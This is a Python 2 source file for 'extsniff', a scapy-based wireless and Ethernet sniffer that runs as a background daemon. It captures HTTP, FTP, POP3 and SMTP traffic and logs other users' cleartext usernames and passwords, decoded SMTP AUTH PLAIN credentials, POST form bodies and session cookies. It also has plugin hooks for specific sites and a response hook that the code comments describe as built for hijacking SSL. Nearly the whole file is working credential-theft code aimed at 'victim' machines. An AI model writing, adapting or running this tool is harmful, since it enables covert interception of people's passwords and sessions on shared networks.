#!/usr/bin/python2.7

#############################################################################
##                                                                         ##
##  Copyleft by WebNuLL < webnull.www at gmail dot com                     ##
##                                                                         ##
## This program is free software; you can redistribute it and/or modify it ##
## under the terms of the GNU General Public License version 2 as          ##
## published by the Free Software Foundation; version 2.                   ##
##                                                                         ##
## This program is distributed in the hope that it will be useful, but     ##
## WITHOUT ANY WARRANTY; without even the implied warranty of              ##
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU       ##
## General Public License for more details.                                ##
##                                                                         ##
#############################################################################

## thanks to Franck TABARY <franck.tab atat gmail thedot com>, but if you are releasing code on GPL
## you cant use "Copyrght" in script


import logging 
import re
import scapy
from scapy.all import sniff,Ether,ARP,conf,TCP,Raw,IP,Dot11,Ether
import getopt
import sys,os,time,glob,base64,md5


#################################
##### Define some constants #####
#################################

APP_NAME='extsniff'
LOGFILE = '/var/log/'+APP_NAME+'.log'
PIDFILE = '/var/log/'+APP_NAME+'.pid'

conf.iface='wlan0'
conf.verb=0
conf.promisc=0

log=None

# options
debugMode=False
consoleMode=False
printCookies=False
additionalModules = False # no additional modules, just for cookie sniffing on HTTP or FTP sniffing

# DEFAULT PORTS
PORTS = dict()
PORTS['HTTP'] = 80
PORTS['FTP'] = 21
PORTS['POP3'] = 110
PORTS['SMTP'] = 25

#expr='tcp port http or tcp port ftp'
expr='tcp port http'

HTTP_HOOKS = dict() # POST
GET_HOOKS = dict()  # GET
RES_HOOKS = dict()  # RESPONSE
#HTTP_HOOKS['facebook'] = dict()
#HTTP_HOOKS['facebook']['url'] = 'facebook.com/editprofile'
#HTTP_HOOKS['facebook']['module'] = 'parseFacebook'

##########################################
##### printUsage: display short help #####
##########################################

def printUsage():
    ''' Prints program usage '''

    print "extsniff - extensible sniffer for GNU/Linux"
    print ""
    print "Usage: extsniff [option] [long GNU option]"
    print ""
    print "Valid options:"
    print "  -h, --help             : display this help"
    print "  -c, --console          : don't fork into background"
    print "  -d, --debug            : switch to debug log level"
    print "  -p, --print-cookies    : print all cookies"
#    print "  -f,                    : filter printed cookies and save to file (does not filter console output)"
    print "  -m,                    : load modules (comma separated)"
    print "  -x, --disable-http     : dont listen on HTTP port 80 (tcp port http)"
    print "  -f, --enable-ftp       : start listening on FTP port 21 (tcp port ftp)"
    print "  -r, --enable-pop3      : start listening on POP3 port 110 (tcp port 110)"
    print "  -s, --enable-smtp      : start listening on POP3 port 25 (tcp port smtp)"
    print ""

try:
    opts, args = getopt.getopt(sys.argv[1:], 'srxfcdphm:', ['print-cookies', 'console','debug','help', 'disable-http', 'disable-ftp', 'enable-pop3', 'enable-smtp'])
except getopt.error, msg:
    print msg
    print 'for help use --help'
    sys.exit(2)

# process options
for o, a in opts:
    if o in ('-h', '--help'):
        printUsage()
        exit(2)
    if o in ('-d', '--debug'):
        debugMode=True
    if o in ('-c', '--console'):
        consoleMode=True
    if o == "-m":
        additionalModules=a
    if o in ('-p', '--print-cookies'):
        printCookies=True
    if o in ('-x', '--disable-http'):
        expr = expr.replace('tcp port http', '')
    if o in ('-f', '--enable-ftp'):
        if expr == 'tcp port http':
           expr = 'tcp port http or tcp port ftp'
        elif expr == '':
           expr = 'tcp port ftp'
    if o in ('-r', '--enable-pop3'):
        if expr == '':
           expr = 'tcp port '+str(PORTS['POP3'])
        else:
           expr = expr+" or tcp port "+str(PORTS['POP3'])
    if o in ('-s', '--enable-smtp'):
        if expr == '':
           expr = 'tcp port '+str(PORTS['SMTP'])
        else:
           expr = expr+" or tcp port "+str(PORTS['SMTP'])

if expr == '':
    print "Please specify services (HTTP or FTP)"
    exit(0)

if additionalModules != False and additionalModules != '*' and additionalModules != 'all':
    smodules = additionalModules.split(',')
    userdir=str(os.popen('cd ~; pwd').read()).replace("\n", '')
    sys.path.append(str(userdir)+"/.extsniff/smods/")

    for smodule in smodules:
        if debugMode == True:
            print "Importing: "+smodule
        try:
            exec("import "+smodule)
        except ImportError:
            print "ERROR: Cannot import "+smodule

        try:
            exec("HTTP_HOOKS['"+smodule+"'] = "+smodule+".L_HOOKS") # POST
            exec("GET_HOOKS['"+smodule+"'] = "+smodule+".G_HOOKS") # GET
            exec("RES_HOOKS['"+smodule+"'] = "+smodule+".R_HOOKS") # RESPONSE
        except AttributeError:
            True

if additionalModules == '*' or additionalModules == 'all':
    userdir=str(os.popen('cd ~; pwd').read()).replace("\n", '')
    sys.path.append(str(userdir)+"/.extsniff/smods/")
    os.chdir(str(userdir)+"/.extsniff/smods/")
    file_list = glob.glob("*.py")

    for i in file_list:
        module_name = str(i).replace('.py', '')
        if debugMode == True:
            print "Importing: "+module_name
        try:
            exec("import "+module_name)
        except ImportError:
            print "ERROR: Cannot import "+module_name

        try:
            exec("HTTP_HOOKS['"+module_name+"'] = "+module_name+".L_HOOKS") # POST
            exec("GET_HOOKS['"+module_name+"'] = "+module_name+".G_HOOKS") # GET
            exec("RES_HOOKS['"+module_name+"'] = "+smodule+".R_HOOKS") # RESPONSE
        except AttributeError:
            True



# poczta.fm
#HTTP_HOOKS['pocztafm'] = dict()
#HTTP_HOOKS['pocztafm']['url'] = 'logowanie.interia.pl/poczta/zaloguj'
#HTTP_HOOKS['pocztafm']['module'] = 'parseInteriaPoczta'

def is_ascii(s):
    ''' Check if string is UTF-8 encoded '''
    return all(ord(c) < 128 for c in s)

def parseHeader(buff,type='response'):
    ''' Parse HTTP Response/Request headers '''

    import re
    SEP = '\r\n\r\n'
    HeadersSEP = '\r*\n(?![\t\x20])'
    import logging
    if SEP in buff:
        header,body = buff.split(SEP,1)
    else:
        header = buff
        body = ''
    headerlines = re.split(HeadersSEP, header)
    
    if len(headerlines) > 1:
        r = dict()
        if type == 'response':
            _t = headerlines[0].split(' ',2)
            if len(_t) == 3:
                httpversion,_code,description = _t
            else:
                return r
            try:
                r['code'] = int(_code)
            except ValueError:
                return r
        elif type == 'request':
            _t = headerlines[0].split(' ',2)
            if len(_t) == 3:
                method,uri,httpversion = _t
                r['method'] = method
                r['uri'] = uri
                r['httpversion'] = httpversion
        else:
            return r  
        r['headers'] = dict()
        for headerline in headerlines[1:]:
            SEP = ':'
            if SEP in headerline:
                tmpname,tmpval = headerline.split(SEP,1)
                name = tmpname.lower().strip()
                val =  map(lambda x: x.strip(),tmpval.split(','))
            else:
                name,val = headerline.lower(),None
            r['headers'][name] = val
        r['body'] = body
        return r

allpackets = dict()
lastPacket = False

def http_monitor_callback(pkt):
        ''' Callback for sniffer() '''

        global allpackets, lastPacket
        if pkt.haslayer(TCP):
              # ack
              if pkt.getlayer(TCP).flags == 24 or pkt.getlayer(TCP).flags == 16:
                  if pkt.haslayer(Raw):
                     tcpdata = pkt.getlayer(Raw).load

                     ipsrc = pkt.getlayer(IP).src
                     ipdst = pkt.getlayer(IP).dst
                     seq = pkt.getlayer(TCP).seq
                     ack = pkt.getlayer(TCP).ack
                     sport=pkt.sprintf("%IP.sport%")
                     dport=pkt.sprintf("%IP.dport%")

                     # is it WIRELESS OR ETHERNET TYPE? GET SOURCE ID (MAC OF VICTIM)
                     if pkt.haslayer(Dot11):
                         uid = pkt.getlayer(Dot11).addr2
                     elif pkt.haslayer(Ether):
                         uid = pkt.getlayer(Ether).src

                     TCP_SID = str(ack)+str(ipsrc)+str(ipdst) # UNIQUE KEY FOR EACH SESSION

                     # CREATING NEW TCP SESSION
                     if not allpackets.has_key(TCP_SID):
                         allpackets[TCP_SID] = dict()
                         allpackets[TCP_SID]['data'] = tcpdata
                         allpackets[TCP_SID]['packets'] = dict()
                         allpackets[TCP_SID]['packets'][seq] = pkt

                         if lastPacket != False:
                             parseData(allpackets[lastPacket]['data'], ipsrc, ipdst, sport, dport, allpackets[lastPacket]['packets'])

                         lastPacket = TCP_SID # mark last packet
                        

                     elif allpackets.has_key(TCP_SID):
                         try:
                             allpackets[TCP_SID]['data'] = allpackets[TCP_SID]['data']+str(tcpdata)
                             allpackets[TCP_SID]['packets'][seq] = pkt
                         except TypeError:
                             False

def parseData (raw, ipsrc, ipdst, sport, dport, pkt=''):
     ''' Determine what kind of data we have and redirect output to parser '''
     global PORTS
     parsedContent = parseHeader(raw)
     sport = str(sport)
     dport = str(dport)

     # check if its HTTP transmission
     if sport == str(PORTS['HTTP']) or dport == str(PORTS['HTTP']):
         parseHTTPData(raw, ipsrc, ipdst, sport, dport, pkt)
     elif sport == str(PORTS['FTP']) or dport == str(PORTS['FTP']):
         parseFTPData(raw, ipsrc, ipdst, sport, dport)
     elif sport == str(PORTS['POP3']) or dport == str(PORTS['POP3']):
         parseFTPData(raw, ipsrc, ipdst, sport, dport, 'POP3')
     elif sport == str(PORTS['SMTP']) or dport == str(PORTS['SMTP']):
         parseSMTPData(raw, ipsrc, ipdst, sport, dport)


########################
##### SMTP PARSER  #####
########################

SMTP_SESSIONS=dict()

def parseSMTPData(raw, ipsrc, ipdst, sport, dport):
    ''' Parse all packets on SMTP port '''

    uid = str(ipsrc)+str(ipdst)
    if not SMTP_SESSIONS.has_key(uid):
        SMTP_SESSIONS[uid] = dict()
        SMTP_SESSIONS[uid]['passwd'] = False
        SMTP_SESSIONS[uid]['login'] = False
        SMTP_SESSIONS[uid]['hash'] = False
    
    if SMTP_SESSIONS.has_key(uid):
        login = re.findall('MAIL FROM:<(.*)@', raw)

        if login:
            SMTP_SESSIONS[uid]['login'] = login[0]

        # easiest method - PLAIN TEXT
        plaintext = re.findall('AUTH PLAIN (.*)\r\n', raw)

        if plaintext:
            SMTP_SESSIONS[uid]['hash'] =  base64.decodestring(plaintext[0])
        try:
            if SMTP_SESSIONS[uid]['hash'] and SMTP_SESSIONS[uid]['login']:
                if SMTP_SESSIONS[uid]['passwd'] == False:
                   loginLen = (len(SMTP_SESSIONS[uid]['login'])+1)
                   hashLen = len(SMTP_SESSIONS[uid]['hash'])
                   SMTP_SESSIONS[uid]['passwd'] = SMTP_SESSIONS[uid]['hash'][loginLen:hashLen]
                   log.info("[SMTP]: server="+ipsrc+", user="+SMTP_SESSIONS[uid]['login']+", passwd="+SMTP_SESSIONS[uid]['passwd'])
        except KeyError:
            True

    

    

########################
##### HTTP PARSER  #####
########################

POSTData = dict()
LastGETRequest = False

def parseHTTPData(raw, ipsrc, ipdst, sport, dport, pkt):
    ''' Parse HTTP Data, Requests/Responses, GET and POST '''

    global printCookies, POSTData, LastGETRequest
    # check if its request or response
    if re.findall('HTTP/1.1 200 OK', raw):
        DataType = 'http:response'
    elif re.findall('GET ', raw):
        DataType = 'http:request:GET'
    elif re.findall('POST ', raw):
        DataType = 'http:request:POST'
    else:
        DataType = 'http:unknown'

    # all HTTP REQUESTS
    if DataType == 'http:request:POST':
        Headers = parseHeader(raw, 'request')

        #SearchHost = str(Headers['headers']['host'][0]).replace('www.', '')
        try:
             URL = Headers['headers']['host'][0]+Headers['uri']
        except KeyError:
             True

        Found=False

        if len(HTTP_HOOKS) > 0:
            for hook in HTTP_HOOKS:
                #print "SEARCHING "+HTTP_HOOKS[hook]['url']+" in "+str(URL)
                if re.findall("(?i)"+HTTP_HOOKS[hook]['url']+"(.*)", str(URL)):
                     # found matches for this packet session
                     exec("InfoParsed = "+str(HTTP_HOOKS[hook]['module'])+"(Headers, ipdst, pkt, raw)")
                     
                     if InfoParsed != None: # fixed type error
                         uid = md5.new(InfoParsed).digest()
    
                         if not POSTData.has_key(uid):
                             POSTData[uid] = True
                             log.info(InfoParsed)
    
                         Found=True
                     break

        if Found == False:
            parsePOST(Headers, ipdst)

        # FIX MISSING HEADERS
        if not Headers['headers'].has_key('referer'):
            Headers['headers']['referer'] = {0:'None'}

        if not Headers['headers'].has_key('cookie'):
            Headers['headers']['cookie'] = {0:'None'}

        if not Headers['headers'].has_key('cookie'):
            Headers['headers']['user-agent'] = {0:'None'}



        if printCookies == True:
            try:
                print Headers['method']+": "+URL+"\n* User-Agent: "+Headers['headers']['user-agent'][0]+"\n* Referer: "+Headers['headers']['referer'][0]+"\n* Cookies: "+Headers['headers']['cookie'][0]+"\n\n"
            except KeyError:
                True
    elif DataType == 'http:request:GET':
        Headers = parseHeader(raw, 'request')

        try:
             LastGETRequest = Headers['headers']['host'][0]+Headers['uri']
        except KeyError:
             True

        # FIX MISSING HEADERS
        if not Headers['headers'].has_key('referer'):
            Headers['headers']['referer'] = {0:'None'}

        if not Headers['headers'].has_key('cookie'):
            Headers['headers']['cookie'] = {0:'None'}

        if not Headers['headers'].has_key('cookie'):
            Headers['headers']['user-agent'] = {0:'None'}

        if len(GET_HOOKS) > 0:
            for hook in GET_HOOKS:
                #print "SEARCHING "+GET_HOOKS[hook]['url']+" in "+str(URL)
                if re.findall("(?i)"+GET_HOOKS[hook]['url']+"(.*)", str(LastGETRequest)):
                     # found matches for this packet session
                     exec("InfoParsed = "+str(GET_HOOKS[hook]['module'])+"(Headers, ipdst, hook, pkt, raw)")
                     
                     if InfoParsed != None: # fixed type error
                         uid = md5.new(InfoParsed).digest()
    
                         if not POSTData.has_key(uid):
                             POSTData[uid] = True
                             log.info(InfoParsed)
    
                         Found=True
                     break


        if printCookies == True:
            try:
                print Headers['method']+": "+LastGETRequest+"\n* User-Agent: "+Headers['headers']['user-agent'][0]+"\n* Referer: "+Headers['headers']['referer'][0]+"\n* Cookies: "+Headers['headers']['cookie'][0]+"\n\n"
            except KeyError:
                True


    elif DataType == 'http:response':
        ##################### RESPONSE, CREATED FOR HIJACKING SSL #####################

        if LastGETRequest == False:
            log.warning("Got response for unknown request")
            return

        Headers = parseHeader(raw, 'response')
        Found=False
        URL = LastGETRequest

        # Mark as used
        #LastGETRequest = False
        if len(RES_HOOKS) > 0:
            for hook in RES_HOOKS:
                #print "SEARCHING "+RES_HOOKS[hook]['url']+" in "+str(URL)
                if re.findall("(?i)"+RES_HOOKS[hook]['url']+"(.*)", str(URL)):
                     # found matches for this packet session
                     exec("InfoParsed = "+str(RES_HOOKS[hook]['module'])+"(Headers, ipdst, hook, pkt, raw)")
                     
                     if InfoParsed != None: # fixed type error
                         uid = md5.new(InfoParsed).digest()
    
                         if not POSTData.has_key(uid):
                             POSTData[uid] = True
                             log.info(InfoParsed)
    
                         Found=True
                     break

def parsePOST(Headers, ipsrc=''):
    ''' Show POST data not parsed by any filter '''
    global POSTData
    # check if body exists...
    if Headers.has_key('body'):
        # check if body is not empty
        if Headers['body'] != "":
            # is UTF-8 encoded?
            if is_ascii(Headers['body']):
                if Headers['headers'].has_key('host'):
                    uid = md5.new("["+Headers['headers']['host'][0]+"]: POST Data: "+Headers['body']).digest()

                    if not POSTData.has_key(uid):
                        POSTData[uid] = True
                        log.info("["+Headers['headers']['host'][0]+"]: POST Data: "+Headers['body'])
            

def parseFacebook(Headers, ipsrc='', hook=''):
    ''' An example of filter '''

    print "Hello facebook, this is a test..."
    return "This will be logged"


#def parseInteriaPoczta(Headers, ipsrc='', hook=''):
#    print Headers

############################
##### FTP/POP3 PARSER  #####
############################

# here will be stored ftp server, username and password to avoid spamming in logs
FTP_CACHE = dict()

def parseFTPData(raw, ipsrc, ipdst, sport, dport, servertype='FTP'):
    ''' Parses FTP and POP3 '''

    global FTP_CACHE, FTP_LOG

    user=re.findall("(?i)USER (.*)",raw)
    pw=re.findall("(?i)PASS (.*)",raw)

    uid = str(ipsrc)+str(ipdst) # unique id

    if len(user) == 1:
       FTP_CACHE[uid] = dict()
       FTP_CACHE[uid]['user'] = str(user[0]).replace('\r', '')

    if FTP_CACHE.has_key(uid) and len(pw) == 1:
       FTP_CACHE[uid]['pass'] = str(pw[0]).replace('\r', '')
       log.info("["+servertype+"]: server="+ipsrc+", user="+FTP_CACHE[uid]['user']+", pass="+FTP_CACHE[uid]['pass']) # SAVE TO FTP LOG

################################
##### HTTP Headers parser  #####
################################

def readHeader(attribute, raw):
    tmp=str(re.findall('(?i)'+str(attribute)+': (.*)', str(raw)))
    tmp=tmp.split('\\\\r')
    return cleanHTTPString(str(tmp[0]));

def cleanHTTPString(string):
    return string.replace('[\'', '').replace('\']', '').replace('"]', '').replace('["', '')

########################################################################
##### daemonize: if -d param not specified, daemonize this program #####
########################################################################

def daemonize (stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
    '''This forks the current process into a daemon.
    The stdin, stdout, and stderr arguments are file names that
    will be opened and be used to replace the standard file descriptors
    in sys.stdin, sys.stdout, and sys.stderr.
    These arguments are optional and default to /dev/null.
    Note that stderr is opened unbuffered, so
    if it shares a file with stdout then interleaved output
    may not appear in the order that you expect.
    '''

    # Do first fork.
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)   # Exit first parent.
    except OSError, e:
        sys.stderr.write ("fork #1 failed: (%d) %s\n" % (e.errno, e.strerror) )
        sys.exit(1)

    # Decouple from parent environment.
    os.chdir("/")
    os.umask(0)
    os.setsid()

    # Do second fork.
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)   # Exit second parent.
    except OSError, e:
        sys.stderr.write ("fork #2 failed: (%d) %s\n" % (e.errno, e.strerror) )
        sys.exit(1)

    # Now I am a daemon!

    # Redirect standard file descriptors.
    si = open(stdin, 'r')
    so = open(stdout, 'a+')
    se = open(stderr, 'a+', 0)
    os.dup2(si.fileno(), sys.stdin.fileno())
    os.dup2(so.fileno(), sys.stdout.fileno())
    os.dup2(se.fileno(), sys.stderr.fileno())

################
##### main #####
################

def main():
    ''' Main function '''
    global log, FTP_LOG, debugMode, consoleMode, printCookies, expr

    log=logging.getLogger(APP_NAME)

    if consoleMode:
        handler = logging.StreamHandler()
    else:
        handler = logging.FileHandler(LOGFILE)

    formatter = logging.Formatter('%(asctime)s %(levelname)s %(message)s')
    handler.setFormatter(formatter)
    log.addHandler(handler)

    if debugMode==False:
        log.setLevel(logging.INFO)
    else:
        log.setLevel(logging.DEBUG)
   
    log.info("Listening on "+expr)

    if debugMode:
        log.info("Debug mode activated")

    if consoleMode:
        log.info("Console mode activated")
    else:
        daemonize()

    try:
        sniff(filter=expr, prn=http_monitor_callback, store=0)
    except KeyboardInterrupt:
        exit(0)


if __name__ == "__main__":
    main()
